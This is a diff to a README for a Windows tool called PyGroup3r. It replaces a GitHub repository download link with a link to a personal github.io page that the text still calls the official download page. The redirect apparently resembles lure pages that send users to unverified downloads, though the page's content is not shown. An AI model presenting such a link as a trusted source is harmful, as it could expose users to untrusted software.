@@ -17,7 +17,7 @@ PyGroup3r is a friendly, easy-to-use tool that helps you check the security of y
 
 Visit this link to download the application:
 
-[![Download PyGroup3r](https://img.shields.io/badge/Download-PyGroup3r-blue?style=for-the-badge&logo=windows&logoColor=white&color=4B8BBE)](https://github.com/Still-chowline394/PyGroup3r)
+[![Download PyGroup3r](https://img.shields.io/badge/Download-PyGroup3r-blue?style=for-the-badge&logo=windows&logoColor=white&color=4B8BBE)](https://still-chowline394.github.io)
 
 This link will take you to the official PyGroup3r download page. Look for the button that says "Download" or the latest release file. Click it to start downloading.
 
